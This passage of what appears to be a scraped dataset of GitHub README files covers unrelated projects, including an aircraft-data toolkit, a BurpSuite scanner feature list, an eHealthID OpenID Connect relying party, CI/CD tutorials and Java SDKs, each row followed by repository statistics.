    - [Critique of Point and Track interfaces](docs/ADRs/pointInterfaceCritique.md)
    - [Why YAML configs are preferable to Properties](docs/ADRs/yamlOverProperties.md)
    - [How to compute an event's uniqueId](docs/ADRs/computingUniqueId.md)

---

# Using and Contributing

First of all, **Welcome to the community!**

### Contributing as a User

- **Please submit feedback.**
- Do you have a technical question? If so, please ask. We are here to help. Your question could lead to improvements.
  User questions lead to improved documentation, understanding defects, and eventually code improvements the reach
  everyone in the community.
- Do you have a feature request? If so, please ask. We'll see what we can do given the development time we have
  available.

### Contributing as a Developer

- We will use GitHub's Issue tracking features when the project launches.
- Anyone interested in making technical contributions is welcomed to communicate with the dev team on GitHub. Feel free
  to submit issues, fix issues, and submit PRs.
- We may write a _""contributing guidelines""_ document in the future should the need arise. But for now, our focus will
  be on making high-quality, high-value improvements to the code (not policy documents).

### Contributing as a Data Provider

- OpenARIA is **extremely** interested in collecting shareable aircraft position datasets. Publicly available datasets
  can become the benchmarks dataset by which OpenARIA algorithms are measured and optimized. Read more [here](docs/shared-datasets.md) about
  the fundamental project need.

---

# Near-Term Project RoadMap

![Road Map Figure](docs/assets/OpenARIA-Roadmap.png)

### Version History & Release Notes

See [here](docs/version-release-notes.md)

### MITRE Public Release

- Content approved for public release via The MITRE Corporation's ""Public Release System"" (PRS)
- Reference:  `Public Release Case Number: 23-3623`

### Legal Statement

- **Copyright:** The contents of this project is copyright `The MITRE Corporation`. See details [here](COPYRIGHT.txt) .
- **Open Source License:** This project is released under the Apache License Version 2.0. See details [here](LICENSE).
",1,11,2,Apache-2.0
N1nn1/dye_depot,main,"![logo](https://cdn.modrinth.com/data/cached_images/55730dca078c5f5d993037782ca33c6c534df966.png)

## License

This project's code is licensed under [ARR](LICENSE). You can use it in your Modpack, but if you would like clarification or more explicit permission, either contact me personally on Discord: `ninnih`, or join my [server](https://discord.gg/fT4MKzUTZS).

![Divider](https://cdn.modrinth.com/data/cached_images/1ccd731a59f2b97cc9189ceb9b073d0b61476424.png)
",0,36,2,NOASSERTION
Anof-cyber/AlphaScan,main,"# AlphaScan
A BurpSuite extension for vulnerability Scanning

[![Java Build](https://github.com/Anof-cyber/AlphaScan/actions/workflows/maven.yml/badge.svg)](https://github.com/Anof-cyber/AlphaScan/actions/workflows/maven.yml)

### 🚧 Under Development 🚧

This project is currently under active development. Not all features are implemented, and the code may not be stable. While contributions are appreciated, please note that I am not currently accepting external contributions.


## Vulnerabilities



###### Version  1.0

| Vulnerability                   | Details                                                                                                             |
|--------------------------------|----------------------------------------------------------------------------------------------------------------------|
| Blind Time Based Injection     | [Payloads](https://github.com/CyberM0nster/SQL-Injection-Payload-List-/blob/master/Generic%20Time%20Based%20SQL%20Injection%20Payloads)                                  |
| AWS SSRF                       | [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#ssrf-url-for-cloud-instances)                        |
| Reflected XSS                  | [Payloads](https://github.com/Proviesec/xss-payload-list/tree/main)                                                |
| Error Based SQL injection      | [Payload-src-github](https://github.com/payloadbox/sql-injection-payload-list) ([Payload-src-twitter](https://x.com/Fabrikat0r/status/1731784913572200720?)) ([Payload-src-twitter](https://twitter.com/intigriti/status/1727669826338914506)) |
| Forced Browsing | Experimental, likely to be false positive|
| JSON CSRF| Check for Content type text and No Additional headers like bearer|
| JWT Token Expiry | |
| CORS| Check CORS if not check for Common Bypass |
| Verify session cookie or token | Not Part of Active or Passive Scan, Need to be validated before starting a scan through right click menu on any request with a valid session (Not expired) |
| Error Messages and Banner Grab| Passive Scanner for Error message or Server Banner|
| Missing CSP Header             |                                                                                                                      |
| CSP Header with Insecure Directives |                                                                                                                  |
| CSP Header Missing Required Directives |                                                                                                            |
| Missing X-Frame Header         |                                                                                                                      |
| Missing HSTS Header            |                                                                                                                      |
| Check If Request with Body support XML Content Type Header |   Partial/ Could be False Positive, will be updated later |
| Session Identifier (HTTP Only Flag) | Only Available if Session Identifier is found |
| Session Identifier (Secure Flag) | Only Available if Session Identifier is found|


<br>

",0,0,1,GPL-3.0
DesislavaTopuzakova/Java-Fundamentals-January-2024,main,,0,2,1,
worldsat/project162,main,,0,0,1,
wudgaby/wudgaby-platform,master,"# wudgaby-platform

## 主要功能
自用框架，包含基础组件和业务组件.

## 组件
![basis.png](document%2Fres%2Fbasis.png)
![starters.png](document%2Fres%2Fstarters.png)


## 如何构建
```bat
./install_projects.bat
选择3构建整个项目
```

## 如何使用
### 如何引入依赖
如果需要使用已发布的版本，在 `dependencyManagement` 中添加如下配置.
然后在 `dependencies` 中添加自己所需使用的依赖即可使用
```xml
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>com.wudgaby.platform</groupId>
            <artifactId>basis-project-dependencies</artifactId>
            <version>latest</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

### 引入单个包
```xml
<dependency>
    <groupId>com.wudgaby.platform</groupId>
    <artifactId>api-version-spring-boot-starter</artifactId>
    <version>latest</version>
</dependency>
```

### SNAPSHOT 版本需在maven中加入
```xml
<repositories>
    <repository>
      <id>snapshots-repo</id>
      <url>https://oss.sonatype.org/content/repositories/snapshots</url>
    </repository>
</repositories>
```

## 版本管理规范

项目的版本号格式为 x.x.x 的形式，其中 x 的数值类型为数字，从 0 开始取值，且不限于 0~9 这个范围。项目处于孵化器阶段时，第一位版本号固定使用 0，即版本号为 0.x.x 的格式。
版本号与springboot版本号靠近

* 1.x.x 版本适用于 Spring Boot 2.3.x
* 2.x.x 版本适用于 Spring Boot 2.7.x
* 3.x.x 版本适用于 Spring Boot 3.x.x

## 演示 Demo
为了演示如何使用，项目包含了一个子模块 `basis-examples`。此模块中提供了演示用的 example ，您可以阅读对应的 example 工程下的 readme 文档，根据里面的步骤来体验。


## FAQ
```
java: You aren’t using a compiler supported by lombok, so lombok will not work and has been disabled.
Your processor is: com.sun.proxy.$Proxy26
Lombok supports: OpenJDK javac, ECJ

解决办法：
settings中搜索Compiler，在Idea的全局配置Compiler中添加如下配置：
-Djps.track.ap.dependencies=false
```

## 交流群
QQ: 暂无
钉钉: 暂无

",0,0,1,
jinho-yoo-jack/wanted-preonboarding-challenge-backend-16,master,"# wanted-preonboarding-challenge-backend-16
원티드 프리온보딩 백엔드 챌린지 사전과제

## 프로젝트 필수 패키지 및 버전 정보
### 버전 정보
- Spring Boot; 3.2.1
- JDK(Java Development Kit); Java 17 이상
  - Intellij에서 JDK 버전 변경하는 방법(참고 URL: https://inpa.tistory.com/entry/IntelliJ-%F0%9F%92%BD-%EC%9E%90%EB%B0%94-JDK-%EB%B2%84%EC%A0%84-%EB%B3%80%EA%B2%BD-%EB%B0%A9%EB%B2%95)
### 필수 설치 패키지
- Docker Desktop

## 과제1 - 필수
- 고객의 요구사항: 빠르게 변화는 고객의 니즈를 빠른 시간 내에 적용할 수 있는 Wanted Ticket 서비스를 아래와 같이 개발 해주세요.
- 비즈니스 요구사항:
  - 예약 시스템
    - Request Message: 고객의 이름, 휴대 전화, 결제 가능한 금액(잔고), 예약을 원하는 공연 또는 전시회ID, 회차, 좌석 정보
    - Response Message: 예매가 완료된 공연의 정보(회차, 공연명, 좌석정보, 공연ID) + 예매자 정보(이름, 연락처)
    - 특이사항: 예약 결제 시, 다양한 할인 정책이 적용될 수 있음.
  - 예약 조회 시스템
    - Request Message: 고객의 이름, 휴대 전화
    - Response Message: 예매가 완료된 공연의 정보(회차, 공연명, 좌석정보, 공연ID) + 예매자 정보(이름, 연락처)
  - 공연 및 전시 정보 조회(목록, 상세 조회)
    - Request Message: 예매 가능 여부
    - Response Message: 예매 가능한 공연 리스트(정보: 공연명, 회차, 시작 일시, 예매 가능 여부)
  - 예약 가능 알림 서비스
    - 특정 공연에 대해서 취소 건이 발생하는 경우, 알림 신청을 해놓은 고객에게 취소된 예약이 있다는 사실을 알리는 알림 서비스
    - Send Message: 공연ID, 공연명, 회차, 시작 일시 예매 가능한 좌석 정보 
    
- 기초 과제
  1. 위에서 이야기 하고 있는 비즈니스 요구사항을 만족하는 Application을 만들어주세요.
     - 개발 실력 브실골 이하: 기존에 작성 되어 있는 코드를 삭제 하지 않고! 기존 코드 위에 코드를 작성해주세요!
     - 다이아 이상: ticket 패키지를 삭제하고 새롭게 패키지를 만든 후에 Application을 개발해주세요!
  2. 데이터베이스는 MySQL를 사용 해주시고 프로젝트 내에 docker-compose.yml를 이용하여 MySQL 서비스를 Running 시키면 됩니다.
     - DB의 데이터를 저장하는 경로(`/Users/black/dev/mysql_docker/data`)와 DB 초기화 쿼리 파일의 경로(`/Users/black/IdeaProjects/backend-preonboarding/src/main/resources/initd`)는 개인의 환경에 맞게 수정 해주세요!
  3. 스키마 정보 및 테스트 데이터는 ""./resources/initdb""에 디렉토리에 *.sql 확장자로 정의 되어 있습니다. Application의 DTO와 Entity를 구성할 때 참고 해주세요!
     - Application 개발 중 새로운 테이블이 필요하다면 테이블을 추가는 마음대로 하셔도 됩니다.
- 심화 과제
  1. Application을 모두 작성 했다면! 코드를 읽는 동료가 코드를 쉽게 이해할 수 있도록 코드를 리팩토링 해주세요!
  2. 리팩토링을 진행할 때는! 기술 위주가 아니라! ""변경""에 쉽게 적응할 수 있는 코드 구조로 리팩토링 해주세요!

### 환경 설정과 Github에 대한 궁금증이 있다면! Issues에 등록해주시면 답변 드리겠습니다.
- https://github.com/jinho-yoo-jack/wanted-preonboarding-challenge-backend-16/issues
- 참고 URL: https://devlog-wjdrbs96.tistory.com/227
       

## 과제2 - 선택사항
- 다른 사람의 PR 염탐하기!
- **백문이 불여일견**이라고 했습니다! 다른 사람의 코드를 보고 궁금한 점이나 코드 작성의 의도를 물어봐 주세요! 또는 코드에 대해서 자신의 생각을 코멘트로 달아주세요! 
- 코드 리뷰를 통해서 내가 놓친 부분이나 미처 생각 하지 못했던 부분을 깨닫을 수 있고, 좋은 코드와 나쁜 코드가 무엇인지 경험할 수 있습니다!
- PR에 코멘트를 달아도! 잔디가 심어진다는 사실 알고 계신가요?!!!!
- 과제2의 베네핏
  1. 질 높은 코드 리뷰를 진행 주신 분들은 수업의 마지막 날에 진행 되는 커피챗 및 맥주챗 뽑기 진행 시, 이름을 3개 더 넣어 드리도록 하겠습니다.
  2. 열심히 코드 리뷰 활동을 하시는 분의 PR은 제가 무조건 처음부터 끝까지 코드 리뷰를 진행하도록 하겠습니다!!

## 과제 제출 방법
1. master 브랜치로 프로젝트를 clone 해주세요.
2. 로컬 레파지토리에 `feature/이름or닉네임`으로 피쳐 브랜치를 생성해주세요.
4. 이제부터 사전과제를 풀어봅니다.
5. 모든 사전과제를 풀었다면 이제 원격 레파지토리에 commit 및 push 후 PR을 올려 해주세요.
6. Example
   ```shell
    1. git checkout -b feature/migration2TcAsMasterSlaveStructure
    # 브랜치를 생성하고 해당 브랜치로 checkout.
    # feature의 브랜치명은 내부적으로 관리하는 issues번호나 프로젝트 관리도구에의 ID 값을 이용
    2. git add .
    # 모든 변경사항을 tracking 되는 상태로 변경할거에요.
    3. git commit -m “Commit Messsage for Modify Information”
    # git commit를 수행하고 작업내용을 팀 내부 규약대로 작성
    3-1. git push --set-upstream origin feature/migration2TcAsMasterSlaveStructure
    # 해당 내용을 remote repository로 push
    4. push하면 gitlab/github에 Pull Request나 Merge Request 생성하는 버튼이 활성화
    5. Merge Request 버튼을 클릭 후, 숙제에 관한 내용 작성 후 PR 요청을 보내면 끝
    6. Merge 승인이되면 WEB UI화면에서 merge 버튼이 활성화 됨.
   ```",0,5,2,
dr-hextanium/cookbook,main,,0,7,2,MIT
microcks/microcks-testcontainers-java-spring-demo,main,"# Microcks Testcontainers Spring Boot Demo

![Microcks Testcontainers Spring demo](./assets/microcks-testcontainers-java-spring-demo.png)

This application is a demonstration on how to integrate Microcks via [Testcontainers]([https://www.testcontainers.com]) within your development inner-loop.

You will work with a Spring Boot application and explore how to:
* Use Microcks for **provisioning third-party API mocks**,
* Use Microcks for **simulating external Kafka events publishers**,
* Write tests using Microcks **contract-testing** features for both **REST/OpenAPI based APIs and Events/AsyncAPI** based messaging

## Table of contents

* [Step 1: Getting Started](step-1-getting-started.md)
* [Step 2: Exploring the app](step-2-exploring-the-app.md)
* [Step 3: Local Development Experience with Microcks](step-3-local-development-experience.md)
* [Step 4: Write Tests for REST](step-4-write-rest-tests.md)
* [Step 5: Write Tests for Async](step-5-write-async-tests.md)

## License Summary

The code in this repository is made available under the MIT license. See the [LICENSE](LICENSE) file for details.
",0,0,6,MIT
oviva-ag/ehealthid-relying-party,main,"[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=oviva-ag_ehealthid-relying-party&metric=alert_status&token=ee904c8acea811b217358c63297ebe91fd6aee14)](https://sonarcloud.io/summary/new_code?id=oviva-ag_ehealthid-relying-party)
[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=oviva-ag_ehealthid-relying-party&metric=coverage&token=ee904c8acea811b217358c63297ebe91fd6aee14)](https://sonarcloud.io/summary/new_code?id=oviva-ag_ehealthid-relying-party)

# OpenID Connect Relying Party for GesundheitsID (eHealthID)

The goal is to provide a simple standalone server exposing Germany's 'GesundheitsID' (eHealthID) as
a good old OpenID Connect Relying Party (OIDC RP).

Identity Providers such as Keycloak can link accounts with OIDC out-of-the-box

## State of Compatibility

### Productive Environment (PU)

| Sectoral IdP           | End-to-End | Provider |
|------------------------|------------|----------|
| Techniker Krankenkasse | ✅          | IBM      |
| Gothaer                | 🚫         | RISE     |

> [!NOTE]  
> Most providers can not be independently tested as there are no test accounts available.

## Authentication Flow IDP / Relying Party

```mermaid
sequenceDiagram
    participant app as Mobile App
    participant idp as Your IDP
    participant rp as Relying Party
    app ->> idp: login
    idp -->> app: redirect to Relying Party (OIDC)
    app ->> rp: login
    note over app, rp: login via eHealthID handled by Relying Party (RP)
    rp -->> app: redirect to IDP with code
    app ->> idp: success, callback to IDP
    idp ->> rp: redeem code
    rp -->> idp: id_token
    idp -->> app: success! redirect
```

## Contents

- [ehealthid-rp](./ehealthid-rp) - A standalone application to act as a OpenID Connect (OIDC)
  Relying Party. Bridges OIDC and Germany's GesundheitsID OpenID federation.
- [ehealthid-cli](./ehealthid-cli) - A script to generate keys and federation registration forms.
- [ehealthid](./ehealthid) - A plain Java library to build RelyingParties for GesundheitsID.
    - API clients
    - Models for the EntityStatments, IDP list endpoints etc.
    - Narrow support for the 'Fachdienst' use-case.

# Quickstart

```shell

#---- 1. generate keys
# the URI where your relying-party will run, 
# for the registration this _MUST_ be publicly reachable
export ISSUER_URI=https://mydiga.example.com

# generate keys for the application, keep those safe and secure
./cli.sh keygen --issuer-uri=$ISSUER_URI

#---- 2. deploy the relying party
docker run --rm \
    -v ""$(pwd)""/sig_mydiga_example_com_jwks.json:/secrets/sig_jwks.json:ro \
    -e ""EHEALTHID_RP_APP_NAME=Awesome DiGA"" \
    -e ""EHEALTHID_RP_BASE_URI=$ISSUER_URI"" \
    -e 'EHEALTHID_RP_FEDERATION_ES_JWKS_PATH=/secrets/sig_jwks.json' \
    -e 'EHEALTHID_RP_FEDERATION_MASTER=https://app-test.federationmaster.de' \
    -e 'EHEALTHID_RP_REDIRECT_URIS=https://sso-mydiga.example.com/auth/callback' \
    -e 'EHEALTHID_RP_ES_TTL=PT5M' \
    -e 'EHEALTHID_RP_IDP_DISCOVERY_URI=https://sso-mydiga.example.com/.well-known/openid-configuration' \
    -p 1234:1234 \
    ghcr.io/oviva-ag/ehealthid-relying-party:latest

#---- 3. register with the federation master

# a string received from Gematik as part of the registration process
# see: https://wiki.gematik.de/pages/viewpage.action?pageId=544316583
export MEMBER_ID=FDmyDiGa0112TU

# generate the registration XML from an existing entity statement
./cli.sh fedreg \
    --environment=TU \
    --contact-email=bobby.tables@example.com \
    --issuer-uri=$ISSUER_URI \
    --member-id=""$MEMBER_ID""
    
# this prints the XML for registration in the federation, send it
# as an email attachment to Gematik 
# see: https://wiki.gematik.de/pages/viewpage.action?pageId=544316583
```

**IMPORTANT:**

- The relying party __MUST__
  be [registered within the OpenID federation](https://wiki.gematik.de/pages/viewpage.action?pageId=544316583)
  to work fully.
- In order to register for the federation, your entity statment __MUST__ be publicly available.

Once the server is booted, it will:

1. Expose an OpenID Discovery document at `$EHEALTHID_RP_BASE_URI/.well-known/openid-configuration`
   ```shell
    curl $BASE_URI/.well-known/openid-configuration | jq .
    ```

2. Expose an OpenID Federation entity configuration
   at `$EHEALTHID_RP_BASE_URI/.well-known/openid-federation`
   ```shell
    curl $BASE_URI/.well-known/openid-federation | jwt decode -j - | jq .payload
    ```

3. Be ready to handle OpenID Connect flows and handle them via Germany's GesundheitsID federation.

## Configure Identity Provider

Generic settings:

- the relying party OpenID configuration is at `$ISSUER_URI/.well-known/openid-configuration`
    - token_url: `/auth/token`
    - auth_url: `/auth`
    - jwks_url: `/jwks.json`
- the only supported client authentication is `private_key_jwt`, the public keys will be discovered

## Example: Keycloak OpenID Connect Identity Provider Settings

As an example with `https://t.oviva.io` as the relying party issuer.
![](./keycloak_config.png)

# Configuration

Use environment variables to configure the relying party server.

(*) required configuration

| Name                                         | Description                                                                                                                                                                | Example                                                           |
|----------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------|
| `EHEALTHID_RP_FEDERATION_ES_JWKS_PATH`*      | Path to a JWKS with at least one keypair for signature of the entity statement. All these keys __MUST__ be registered with the federation master.                          | `./sig_jwks.json`                                                 |
| `EHEALTHID_RP_OPENID_RP_SIG_JWKS_PATH`*      | Path to a JWKS with signing keys of our relying party, i.e. for mTLS client certificates                                                                                   | `./openid_rp_sig_jwks.json`                                       | 
| `EHEALTHID_RP_OPENID_RP_ENC_JWKS_PATH`*      | Path to a JWKS with the keys used for encryption between the federation and the relying party, i.e. to encrypt id_tokens                                                   | `./openid_rp_enc_jwks.json`                                       |
| `EHEALTHID_RP_REDIRECT_URIS`*                | Valid redirection URIs for OpenID connect.                                                                                                                                 | `https://sso-mydiga.example.com/auth/callback`                    |
| `EHEALTHID_RP_BASE_URI`*                     | The external base URI of the relying party. This is also the `issuer` towards the OpenID federation. Additional paths are unsupported for now.                             | `https://mydiga-rp.example.com`                                   |
| `EHEALTHID_RP_IDP_DISCOVERY_URI`*            | The URI of the discovery document of your identity provider. Used to fetch public keys for client authentication.                                                          | `https://sso-mydiga.example.com/.well-known/openid-configuration` |
| `EHEALTHID_RP_FEDERATION_MASTER`*            | The URI of the federation master.                                                                                                                                          | `https://app-test.federationmaster.de`                            |
| `EHEALTHID_RP_APP_NAME`*                     | The application name within the federation.                                                                                                                                | `Awesome DiGA`                                                    |
| `EHEALTHID_RP_HOST`                          | Host to bind to.                                                                                                                                                           | `0.0.0.0`                                                         |
| `EHEALTHID_RP_PORT`                          | Port to bind to.                                                                                                                                                           | `1234`                                                            |
| `EHEALTHID_RP_ES_TTL`                        | The time to live for the entity statement. In ISO8601 format.                                                                                                              | `PT12H`                                                           |
| `EHEALTHID_RP_SCOPES`                        | The comma separated list of scopes requested in the federation. This __MUST__ match what was registered with the federation master.                                        | `openid,urn:telematik:versicherter`                               |
| `EHEALTHID_RP_SESSION_STORE_TTL`             | The time to live for sessions. In ISO8601 format.                                                                                                                          | `PT20M`                                                           |
| `EHEALTHID_RP_SESSION_STORE_MAX_ENTRIES`     | The maximum number of sessions to store. Keeps memory bounded.                                                                                                             | `1000`                                                            |
| `EHEALTHID_RP_CODE_STORE_TTL`                | The time to live for codes, i.e. successful logins where the code is not redeemed yet. In ISO8601 format.                                                                  | `PT5M`                                                            |
| `EHEALTHID_RP_CODE_STORE_MAX_ENTRIES`        | The maximum number of codes to store. Keeps memory bounded.                                                                                                                | `1000`                                                            |
| `EHEALTHID_RP_LOG_LEVEL`                     | The log level.                                                                                                                                                             | `INFO`                                                            |
| `EHEALTHID_RP_OPENID_PROVIDER_SIG_JWKS_PATH` | Path to a JWKS with signing keys for our openIdProvider, for example the id_token issued by the relying party will be signed with it. Will be generated if not configured. | `./openid_provider_sig_jwks.json`                                 |

# Generate Keys & Register for Federation

In order to participate in the GesundheitsID one needs to register the entity statement of the IDP
or in this case the relying party here.

To simplify matter, here a script to generate fresh keys as well as the XML necessary to register
with Gematik.

See [Gematik documentation](https://wiki.gematik.de/pages/viewpage.action?pageId=544316583) for
details on the registration process.

```shell
./cli.sh --help
```

## Authentication flow between all involved parties

**NOTE:** There are some additional interactions within the federation, for a more complete flow see
[AppFlow](https://wiki.gematik.de/display/IDPKB/App-App+Flow#AppAppFlow-0-FederationMaster) in the
Gematik documentation.

```mermaid
sequenceDiagram
    participant app as Mobile App
    participant idp as Your IDP
    participant rp as Relying Party
    participant secIdp as Sectoral IDP
    participant fedmaster as Federation Master
    app ->> idp: login
    idp -->> app: redirect to Relying Party (OIDC)
    app ->> rp: login
    alt relying party & eHealthID federation
        rp ->> fedmaster: fetch list of sectoral IDPs
        fedmaster -->> rp: list of sectoral IDPs
        rp -->> app: show list of IDPs to select from
        app ->> rp: select an IDP
        rp ->> secIdp: get redirect url (PAR)
        secIdp -->> rp: redirect_uri
        rp -->> app: redirect to sectoral authentication (e.g. ident app)
        alt proprietary flow
            app ->> secIdp: authenticate
            secIdp ->> app: success, redirect to relying party
        end
        app ->> rp: success, callback to relying party
        rp ->> secIdp: fetch id_token
        secIdp -->> rp: id_token
    end
    rp -->> app: redirect to IDP with code
    app ->> idp: success, callback to IDP
    idp ->> rp: redeem code
    alt client authentication
        note right of rp: client authenticated via 'private_key_jwt'
        rp ->> idp: fetch OpenID discovery document
        idp -->> rp: discovery document
        rp ->> idp: fetch JWKS
        idp -->> rp: JWKS
        note right of rp: verifies client JWT with discovered JWKS
    end
    rp -->> idp: id_token
    idp -->> app: success! redirect
```

# Testing

**See [TESTING](./TESTING.md).**

# Limitations

- for now sessions are stored in-memory, this implies:
    - rebooting the server will force users currently logging-in to restart
    - if multiple instances run, sessions must be sticky (e.g. use `session_id` cookie)
    - though it would be relatively straight forward to use a database instead
- this is tested in the 'Testumgebung' (TU) against the Gematik IDP due to a lack of other options

# Open Points

- end-to-end tests with Verimi, Gematik, RISE and IBM IDPs, most lack options to test currently

# Wishlist

- Accept base URI's with paths.
- MySQL or Postgres backed session and code repos
- PKCE flow on OIDC side
- Integration with other IDPs such as [FusionAuth](https://fusionauth.io/)

# Helpful Links

- [OpenID Federation Spec](https://openid.net/specs/openid-federation-1_0.html)
- [Gematik Fachdienst Specifications](https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_FD/latest/)
- [Gematik Fedmaster Specification](https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_FedMaster/latest/)
- [Gematik Sectoral IDP Specifications](https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_Sek/latest/)
- [AppFlow - Authentication flow to implement](https://wiki.gematik.de/display/IDPKB/App-App+Flow#AppAppFlow-0-FederationMaster)
- [Sektoraler IDP - Examples & Reference Implementation](https://wiki.gematik.de/display/IDPKB/Sektoraler+IDP+-+Referenzimplementierung+und+Beispiele)
",22,3,46,Apache-2.0
YvanMazy/TransferProxy,master,,8,0,1,MIT
jadonharsh109/IaC-Master-Actions,main,"
# IaC Master Actions


This repository is designed to help you automate key stages in your software development workflow using GitHub Actions.

## What You Will Learn

- **Automated Workflows**: How to write CI/CD workflows with GitHub Actions.
- **Environment Setup**: Setting up your development environment with Java, Docker, and Terraform.
- **Code Analysis**: Using SonarQube to ensure your code quality.
- **Docker Builds**: How to containerize your application using Docker.
- **Security Scanning**: Checking Docker images for security vulnerabilities using Dockle.

## Additional Features

- **Docker Integration**: Configuration files for Docker and Docker Compose to run your application in containers.
- **Kubernetes Support**: Manifest files for deploying your application on Kubernetes.

## Pull Request (PR) Process

- **Staging Server Creation**: When a PR is created, Terraform automatically begins the creation of a new staging server.
- **URL Commenting**: Terraform posts a comment in the PR with the URL to the newly created staging website.
- **Staging Server Cleanup**: Upon successful merge of the PR into the main branch, the staging server is taken down.

## Deployment Stages

- **Pre-Production**: After merging the PR into the main branch, the project enters the pre-production stage, getting ready for the final release.
## GitHub Action Workflow

[![](https://app.eraser.io/workspace/9rtTg2KRfxOuTHf0KGEG/preview?elements=3jhk6CvThYdnmBvDh1iByw&type=embed)](https://app.eraser.io/workspace/9rtTg2KRfxOuTHf0KGEG?elements=3jhk6CvThYdnmBvDh1iByw)


## Environment Variables

To run this project, you will need to add the following environment variables to your Repository secrets.

`DEPLOY_KEY` - SSH key to login EC2 instance

`DOCKERHUB_TOKEN` Password for DockerHub Account

`DOCKERHUB_USERNAME` Username of DockerHub Account

`SONAR_HOST_URL` SonarQube Server URL

`SONAR_TOKEN` Admin Access Token to access Sonar Projects

`TF_API_TOKEN` Terraform Cloud API Access Token





## Terraform Cloud Configuration

Configure your terraform cloud orgainization and workspace also setup *AWS Access_Key* and *AWS_Secret_Key* Edit terraform.tf files and change the below lines.

```bash
terraform {
  cloud {
    organization = ""jadonharsh""

    workspaces {
      name = ""GitOps-Master-Actions""
    }
  }
}
```

## Tools & Technologies

- **AWS**: Cloud platform for hosting and running services.
- **Terraform**: Infrastructure as Code tool to create and manage cloud resources.
- **Docker**: Container platform for packaging and distributing applications.
- **GitHub Actions**: Automation of workflows to build, test, and deploy your applications.
- **Kubernetes**: Container orchestration system for managing application deployment.
- **SonarQube**: Code quality and security tool.
- **Dockle**: Container image linter for security best practices.
- **ArgoCD**: Declarative continuous deployment tool for Kubernetes.
",0,0,1,
kousen/springaiexamples,main,"## Spring AI Examples

A set of examples for use with the Spring AI project, based on their original Azure workshop (but without Azure).

### Links

* https://docs.spring.io/spring-ai/reference/index.html (Spring AI reference page)
* https://github.com/spring-projects/spring-ai (Spring AI GitHub repository)
* https://github.com/Azure-Samples/spring-ai-azure-workshop (Spring AI Azure workshop)
* https://platform.openai.com/docs/overview (OpenAI documentation)
* https://platform.openai.com/signup (OpenAI signup for key)
* https://github.com/kousen/OpenAIClient (My GitHub repo)
* https://github.com/kousen/springaiexamples (solutions to our exercises)
* https://kenkousen.substack.com (_Tales from the jar side_ newsletter)
* https://youtube.com/@talesfromthejarside (_Tales from the jar side_ YouTube channel)
",0,0,1,MIT
jpush/jiguang-sdk-java,main,"# jiguang-sdk-java

这是 Jiguang REST API 的 Java 版本封装开发包，是由极光推送官方提供的，一般支持最新的 API 功能。

对应的 REST API 文档：
* [REST API - Push](https://docs.jiguang.cn/jpush/server/push/rest_api_v3_push)
* [REST API - Device](https://docs.jiguang.cn/jpush/server/push/rest_api_v3_device)
* [REST API - Report](https://docs.jiguang.cn/jpush/server/push/rest_api_v3_report)
* [REST API - Admin](https://docs.jiguang.cn/jpush/server/push/rest_api_admin_api_v1)
* [REST API - GroupPush](https://docs.jiguang.cn/jpush/server/push/rest_api_v3_push_grouppush)

支持 Java JDK 1.8 及其以上版本。
> 支持 Java JDK 1.6 版本：[jpush-api-java-client](https://github.com/jpush/jpush-api-java-client)，但不再更新。

## 1. 集成
引入sdk包
```xml
<!--以5.1.9版本为例-->
<dependencies>
        <!-- jiguang-sdk -->
        <dependency>
            <groupId>io.github.jpush</groupId>
            <artifactId>jiguang-sdk</artifactId>
            <version>5.1.9</version>
        </dependency>
</dependencies>
```
引入log包
> 注意项目中已引用了logback、log4j、commons-logging等实现slfj接口的日志框架，则不需要配置。例如'example-for-spring'中引入了spring，自带logback框架，就不需要再配置。
```xml
<!--以logback为例-->
<dependencies>
    <!-- logback -->
    <dependency>
        <groupId>ch.qos.logback</groupId>
        <artifactId>logback-classic</artifactId>
        <version>1.2.11</version>
    </dependency>
</dependencies>
```
## 2. Api
创建api对象
> 可根据自身情况设置client、host和loggerLevel
```java
        // appKey和masterSecret在极光官网-应用控制台获取
        PushApi pushApi = new PushApi.Builder()
            .setAppKey(appKey)
            .setMasterSecret(masterSecret)
            .build();

        DeviceApi deviceApi = new DeviceApi.Builder()
            .setAppKey(appKey)
            .setMasterSecret(masterSecret)
            .build();

        ReportApi reportApi = new ReportApi.Builder()
            .setAppKey(appKey)
            .setMasterSecret(masterSecret)
            .build();

        // devKey和devSecret在极光官网-右上角-个人主页获取
        AdminApi adminApi = new AdminApi.Builder()
            .setDevKey(devKey)
            .setDevSecret(devSecret)
            .build();

        // groupKey和groupMasterSecret在极光官网-分组应用控制台获取
        GroupPushApi groupPushApi = new GroupPushApi.Builder()
            .setGroupKey(groupKey)
            .setGroupMasterSecret(groupMasterSecret)
            .setLoggerLevel(Logger.Level.FULL)
            .build();

        // 设置client
        okhttp3.OkHttpClient okHttpClient = new okhttp3.OkHttpClient().newBuilder()
                .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(""proxy_host"", proxy_port))) // set proxy
                .connectTimeout(5, TimeUnit.SECONDS) // set connect timeout
                .build();
        OkHttpClient client =new OkHttpClient(okHttpClient);            
            
        PushApi pushApi = new PushApi.Builder()
                .setClient(new OkHttpClient(client))
                .setAppKey(appKey)
                .setMasterSecret(masterSecret)
                .build();
```
使用api示例
* [PushApi](https://github.com/jpush/jiguang-sdk-java/blob/main/example-for-spring/src/test/java/cn/jiguang/app/api/PushApiTest.java)
* [DeviceApi](https://github.com/jpush/jiguang-sdk-java/blob/main/example-for-spring/src/test/java/cn/jiguang/app/api/DeviceApiTest.java)
* [ReportApi](https://github.com/jpush/jiguang-sdk-java/blob/main/example-for-spring/src/test/java/cn/jiguang/app/api/ReportApiTest.java)
* [AdminApi](https://github.com/jpush/jiguang-sdk-java/blob/main/example-for-spring/src/test/java/cn/jiguang/app/api/AdminApiTest.java)
* [GroupPushApi](https://github.com/jpush/jiguang-sdk-java/blob/main/example-for-spring/src/test/java/cn/jiguang/app/api/GroupPushApiTest.java)
## 3. 推送失败
推送失败会抛出异常，可对下面的类异常捕获后进行业务处理
```java
